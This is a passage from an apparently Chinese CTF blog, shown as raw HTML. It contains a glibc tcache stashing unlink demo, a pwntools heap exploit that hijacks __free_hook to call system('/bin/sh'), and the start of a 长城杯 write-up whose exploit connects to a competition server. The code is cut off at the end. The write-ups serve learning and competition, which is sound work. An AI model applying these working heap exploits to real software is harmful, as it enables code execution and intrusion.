class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    unsigned long stack_var[0x10] = &#123;0&#125;;</span><br><span class="line">    unsigned long *chunk_lis[0x10] = &#123;0&#125;;</span><br><span class="line">    unsigned long *target;</span><br><span class="line"></span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line"></span><br><span class="line">    printf(&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;);</span><br><span class="line">    printf(&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;);</span><br><span class="line">    printf(&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;);</span><br><span class="line">    printf(&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;);</span><br><span class="line">    printf(&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    // stack_var emulate the fake_chunk we want to alloc to</span><br><span class="line">    printf(&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;);</span><br><span class="line">    printf(&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    stack_var[3] = (unsigned long)(&amp;stack_var[2]);//这个地址是任意的可写地址</span><br><span class="line"></span><br><span class="line">    printf(&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;,(void*)stack_var[3]);</span><br><span class="line">    printf(&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;,(void*)stack_var[4]);</span><br><span class="line">    printf(&quot;Now we alloc 9 chunks with malloc.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    //now we malloc 9 chunks</span><br><span class="line">    for(int i = 0;i &lt; 9;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (unsigned long*)malloc(0x90);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //put 7 chunks into tcache</span><br><span class="line">    printf(&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    for(int i = 3;i &lt; 9;i++)&#123;</span><br><span class="line">        free(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    //last tcache bin</span><br><span class="line">    free(chunk_lis[1]);</span><br><span class="line">    //now they are put into unsorted bin</span><br><span class="line">    free(chunk_lis[0]);</span><br><span class="line">    free(chunk_lis[2]);</span><br><span class="line"></span><br><span class="line">    //convert into small bin</span><br><span class="line">    printf(&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    malloc(0xa0);// size &gt; 0x90</span><br><span class="line"></span><br><span class="line">    //now 5 tcache bins</span><br><span class="line">    printf(&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    malloc(0x90);</span><br><span class="line">    malloc(0x90);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;,(void*)stack_var);</span><br><span class="line"></span><br><span class="line">    //change victim-&gt;bck</span><br><span class="line">    /*VULNERABILITY*/</span><br><span class="line">    chunk_lis[2][1] = (unsigned long)stack_var;</span><br><span class="line">    /*VULNERABILITY*/</span><br><span class="line"></span><br><span class="line">    //trigger the attack</span><br><span class="line">    printf(&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    calloc(1,0x90);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;,(void*)stack_var[2],(void*)stack_var[4]);</span><br><span class="line"></span><br><span class="line">    //malloc and return our fake chunk on stack</span><br><span class="line">    target = malloc(0x90);   </span><br><span class="line"></span><br><span class="line">    printf(&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;,(void*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[2]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先放入5个tcache，再放入两个smallbin，然后改倒数第二个smallbinchunk的bck为一个可写地址，紧接着申请掉smallbin中的最后一个chunk，执行两次将smallbin中的chunk放入tcache中的操作，就可以将可写地址放入tcache中，达到任意地址写的目的。</p><hr><p>利用手法2：</p><p>这里我们用一个例题来说明。</p><p>首先大小被限制在0x90~0x200之间。</p><p><img src="/2021/10/01/tcache-stashing-unlink-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211007171728126.png" class="lazyload placeholder" data-srcset="/2021/10/01/tcache-stashing-unlink-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211007171728126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211007171728126"></p><p>漏洞点在于free后没有置0</p><p><img src="/2021/10/01/tcache-stashing-unlink-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211007171820784.png" class="lazyload placeholder" data-srcset="/2021/10/01/tcache-stashing-unlink-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211007171820784.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211007171820784"></p><p>这个题需要我们先利用tcache_stashing_unlink去打global_max_fast,因为我们只需要改变global_max_fast的值所以在这我们就将tcache填入6个，smallbin填入两个，执行一次将smallbin中的chunk放入tcache中的操作，就可以将global_max_fast的值改为main_arena的值。</p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">for i in range(4):</span><br><span class="line">add(0x1f8)#0~3</span><br><span class="line">for i in range(2):</span><br><span class="line">add(0xe8)#4~5</span><br><span class="line">for i in range(6):</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,&#x27;\x00&#x27;*0x10)</span><br><span class="line">for i in range(7):</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,&#x27;\x00&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">dele(2)</span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(&#x27;ent: &#x27;)</span><br><span class="line">libc_base=u64(io.recv(6)+&#x27;\x00\x00&#x27;)-libc.symbols[&#x27;__malloc_hook&#x27;]-96-16</span><br><span class="line">binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">global_max_fast=libc_base+0x1eeb80</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">io.recvuntil(&#x27;ent: &#x27;)</span><br><span class="line">heap_base=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))+0x110</span><br><span class="line">print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x108)#6</span><br><span class="line">add(0x108)#7</span><br><span class="line">add(0x108)#8</span><br><span class="line">edit(2,&#x27;\x00&#x27;*0x108+p64(0xf1)+p64(heap_base)+p64(libc_base+0x1eeb80-0x10))</span><br><span class="line">add(0xe8)#9</span><br></pre></td></tr></table></figure><p>改变global_max_fast的值后free的chunk都会被放入到fastbin中，并且我们发现_IO_2_1_stderr_中有8个字节的0xff，所以我们可以申请0xf0大小的chunk，又因为free_hook在main_arena之后不远处,且以下函数也都在</p><ul><li>_IO_list_all</li><li>stdout</li><li>stdin</li><li>stderr</li><li>__free_hook</li></ul><p>我们就可以不断的向下申请chunk直到申请到目标函数。因为要保持到目标函数中间的数据都不变，所以我们需要dump中间的这些数据到文件中<code>dump memory 文件位置 起始地址 结束地址（不包含）</code> ,我们申请到__free_hook函数处填入system地址即可。</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;,str(index))</span><br><span class="line">io.sendafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">for i in range(4):</span><br><span class="line">add(0x1f8)#0~3</span><br><span class="line">for i in range(2):</span><br><span class="line">add(0xe8)#4~5</span><br><span class="line">for i in range(6):</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,&#x27;\x00&#x27;*0x10)</span><br><span class="line">for i in range(7):</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,&#x27;\x00&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">dele(2)</span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(&#x27;ent: &#x27;)</span><br><span class="line">libc_base=u64(io.recv(6)+&#x27;\x00\x00&#x27;)-libc.symbols[&#x27;__malloc_hook&#x27;]-96-16</span><br><span class="line">binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">global_max_fast=libc_base+0x1eeb80</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">io.recvuntil(&#x27;ent: &#x27;)</span><br><span class="line">heap_base=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))+0x110</span><br><span class="line">print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x108)#6</span><br><span class="line">add(0x108)#7</span><br><span class="line">add(0x108)#8</span><br><span class="line">edit(2,&#x27;\x00&#x27;*0x108+p64(0xf1)+p64(heap_base)+p64(libc_base+0x1eeb80-0x10))</span><br><span class="line">add(0xe8)#9</span><br><span class="line">#tcache_stashing_unlink over</span><br><span class="line"></span><br><span class="line">dele(5)</span><br><span class="line">edit(5,p64(libc_base+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]+0x90-1))</span><br><span class="line">add(0xe8)#10</span><br><span class="line">add(0xe8)#11</span><br><span class="line">edit(11,&#x27;\x00&#x27;+p64(0)+p64(0x20f))</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,p64(libc_base+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]+0xa0))</span><br><span class="line">add(0x1f8)#12</span><br><span class="line">add(0x1f8)#13</span><br><span class="line"></span><br><span class="line">payload=&#x27;\x00&#x27;*0x28+p64(libc.symbols[&#x27;_IO_file_jumps&#x27;]+libc_base)</span><br><span class="line">payload+=p64(0xfbad2887)+p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]+131)*7</span><br><span class="line">payload+=p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]+132)+p64(0)*4</span><br><span class="line">payload+=p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;])+p64(1)+&#x27;\xff&#x27;*8</span><br><span class="line">payload+=&#x27;\x00&#x27;*3+&#x27;\x0a&#x27;+p32(0)+p64(libc_base+0x1ee4c0)</span><br><span class="line">payload+=&#x27;\xff&#x27;*8+p64(0)+p64(libc_base+0x1eb880)+p64(0)*3</span><br><span class="line">payload+=&#x27;\xff&#x27;*4+&#x27;\x00&#x27;*0x14+p64(libc_base+libc.symbols[&#x27;_IO_file_jumps&#x27;])</span><br><span class="line">payload+=p64(libc_base+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;])</span><br><span class="line">payload+=p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;])</span><br><span class="line">payload+=p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;])</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload=payload.ljust(0x1f0,&#x27;\x00&#x27;)</span><br><span class="line">payload+=p64(0x20f)</span><br><span class="line">edit(13,payload)</span><br><span class="line"></span><br><span class="line">def encode(a,b):</span><br><span class="line">offset=b-0x7f0b79060000</span><br><span class="line">c=&#x27;&#x27;</span><br><span class="line">for i in range(0x1f*2):</span><br><span class="line">if u64(a[i*8:i*8+8])&gt;0x7f0000000000 and u64(a[i*8:i*8+8])&lt;0x800000000000:</span><br><span class="line">c+=p64(u64(a[i*8:i*8+8])+offset)</span><br><span class="line">else:</span><br><span class="line">c+=p64(u64(a[i*8:i*8+8]))</span><br><span class="line">return c</span><br><span class="line"></span><br><span class="line">fd=open(&#x27;./2&#x27;,&#x27;r&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(0x11):</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,p64(libc_base+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]+0xa0+0x1f8*(i+1)))</span><br><span class="line">add(0x1f8)#14~15\</span><br><span class="line">add(0x1f8)</span><br><span class="line">payload=fd.read(0x1f0).ljust(0x1f0,&#x27;a&#x27;)</span><br><span class="line">fd.read(8)</span><br><span class="line">payload=encode(payload,libc_base)</span><br><span class="line">payload+=p64(0x20f)</span><br><span class="line">edit(15+i*2,payload)</span><br><span class="line"></span><br><span class="line">dele(3)</span><br><span class="line">edit(3,p64(libc_base+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]+0xa0+0x1f8*(i+2)))</span><br><span class="line">add(0x1f8)</span><br><span class="line">add(0x1f8)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload=&#x27;\x00&#x27;*0x148+p64(system)</span><br><span class="line">edit(15+i*2+2,payload)</span><br><span class="line">edit(0,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>长城杯</title>
      <link href="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
      <url>/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="长城杯wp"><a href="#长城杯wp" class="headerlink" title="长城杯wp"></a>长城杯wp</h3><span id="more"></span><p><em>高校组好卷，出来这么多题还是进不了线下，最后是16名。。。题目的话pwn都是常规题，还有一道虚拟机的题日后有时间复现复现</em></p><p><img src="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/20210919171314.png" class="lazyload placeholder" data-srcset="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/20210919171314.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>1.</p><p>这题漏洞点挺多，第一个在，free后指针没置0</p><p><img src="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image002.jpg" class="lazyload placeholder" data-srcset="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image002.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>第二个off-by-one漏洞</p><p><img src="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image004.jpg" class="lazyload placeholder" data-srcset="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image004.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>因为没有输出功能，所以我们直接打stdout泄露出libc_base，再用unsortedbin attack将free_hook上方写入\x7f然后直接打free_hook</p><p><del>不知道为啥最近利用malloc__hook、realloc_hook打gadget总是失败exceve的第三个参数总是不为0</del></p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;input index:\n&#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;size:\n&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;input index:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;input index:\n&#x27;,str(index))</span><br><span class="line">io.sendafter(&#x27;context:\n&#x27;,context)</span><br><span class="line"></span><br><span class="line">def gift():</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;666&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">add(0,0x88)#0</span><br><span class="line">add(1,0x68)#1</span><br><span class="line">add(2,0x78)#2</span><br><span class="line">add(3,0x68)#3</span><br><span class="line">add(4,0x18)#4</span><br><span class="line">edit(1,&#x27;a&#x27;*0x68+p16(0xf1))</span><br><span class="line"></span><br><span class="line">dele(2)</span><br><span class="line"></span><br><span class="line">dele(3)</span><br><span class="line">add(2,0x78)#2</span><br><span class="line">edit(3,p16(0x85dd)+&#x27;\n&#x27;)</span><br><span class="line">add(5,0x68)#5 = 3</span><br><span class="line"></span><br><span class="line">add(6,0x68)#6 stdout</span><br><span class="line">edit(6,&#x27;a&#x27;*0x33+p64(0xfbad1887)+p64(0)*3+p8(0x88)+&#x27;\n&#x27;)</span><br><span class="line">stdin=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base=stdin-libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">edit(3,p64(malloc_hook+88+16)+p64(free_hook-0x28)+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">add(9,0x68)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook-0x1b)+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">add(1,0x68)#1</span><br><span class="line">add(7,0x68)#7</span><br><span class="line"></span><br><span class="line">edit(7,&#x27;/bin/sh\x00&#x27;+&#x27;a&#x27;*(0xb-8)+p64(system)+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">#exp()</span><br><span class="line">i=0</span><br><span class="line">while(i!=20):</span><br><span class="line">try:</span><br><span class="line">#io=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line">io=remote(&#x27;47.104.190.157&#x27; ,26840)</span><br><span class="line">exp()</span><br><span class="line">i+=1</span><br><span class="line">except:</span><br><span class="line">io.close()</span><br><span class="line">i+=1</span><br></pre></td></tr></table></figure><p>2.</p><p>开了沙箱</p><p><img src="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image003.jpg" class="lazyload placeholder" data-srcset="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image003.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>这个题的漏洞点在free后没有置0</p><p><img src="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image005.jpg" class="lazyload placeholder" data-srcset="/2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/clip_image005.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>且申请的大小也被限制在0x10~0x60之间，我们利用tcache_struct这个大小为0x250的chunk来获得libc_base，接着利用free_hook执行setcontex函数将栈迁到堆上执行我们构造的rop读取flag</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 